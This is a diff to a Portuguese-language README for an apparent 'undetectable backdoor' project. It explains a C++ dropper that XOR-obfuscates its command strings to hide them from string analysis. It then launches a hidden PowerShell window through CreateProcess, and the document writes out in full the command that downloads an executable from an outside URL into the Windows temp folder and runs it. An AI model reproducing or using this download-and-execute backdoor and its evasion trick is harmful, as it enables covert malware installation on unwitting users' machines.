@@ -2,19 +2,22 @@
 A função do backdoor é fazer download de um executável via powershell direto na pasta e temp, em seguida executar o arquivo, tudo usando uma função onde a janela do console fica no modo em que não seja visível para o usuário. Esse método é comum em criadores de malware, onde muitos usam métodos mais complexos para evitar a detecção, como programar um arquivo onde ele fica dormindo até alguém pressionar uma tecla, ou até atingir um certo tempo, etc..  
 
 ### Criptografia Xor
-A matemática da criptografia xor que fiz foi bem simples, onde a chave da criptação é o tamanho da string vezes 2 divido por 100, fazendo com que a chave seja a própia string desejada, se quiser saber mais sobre criptografica xor que fiz ![clica aqui](https://github.com/andreyquerino/CriptografiaXor).
+Para explicar resumidamente, ele cria um array Decrypter de nosso array char e faz o xors de volta usando a chave para converter o valor criptografado para o valor original e os armazena no array de dados descriptografado que criamos anteriormente. Com a ajuda disso, se alguém executar strings, não será capaz de ver nenhum comando no executável. Eles precisariam entender a matemática e definir um ponto de interrupção adequado no Debugger. 
+<br />
+A equação matemática da criptografia xor que fiz foi bem simples, a chave da criptação é o tamanho da string vezes 2 divido por 100, fazendo com que a chave seja a própria string desejada. se quiser saber mais sobre criptografica xor que fiz ![clica aqui](https://github.com/andreyquerino/CriptografiaXor).
+
 ```c++
 void Decrypter(char CriptXor[]) {  
     int QuantidadeString = strlen(CriptXor); // Determina o tamanho da string.
     for (int i = 0; i < QuantidadeString; i++){ 
-        CriptXor[i] = CriptXor[i] ^ (QuantidadeString*2/100); // A chave da criptografia é o tamanho da string * 2 / 100.
+        CriptXor[i] = CriptXor[i] ^ (QuantidadeString*2/100); // Tamanho da string * 2 / 100.
     } 
 } 
 ```
 ![Encript](https://user-images.githubusercontent.com/88719652/129620582-31e6f1bc-1025-4365-8511-b6aac50d4ac0.png)
 
 ### CreateProcess
-Essa parte do código cria o processo powershell usando API do windows, mas antes, A função Decrypter vai fazer a decodificação antes de abrir o processo onde os seguintes comando são coordenados para fazer o download do executável MrQuerino.exe via "wget", alocando na pasta temp com o nome de WelCome.exe e na sequência executando.
+Essa parte do código cria o processo powershell usando API do windows, mas antes, A função Decrypter vai fazer a decodificação da string no tempo da execução antes de abrir o processo onde os seguintes comando são coordenados para fazer, o download do executável MrQuerino.exe via "wget", alocando na pasta temp com o nome de WelCome.exe e na sequência executalo.
 
 > powershell.exe wget https://github.com/andreyquerino/Backdoor-Indetectavel/blob/main/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelCome.exe;start C:\\windows\\temp\\WelCome.exe
 
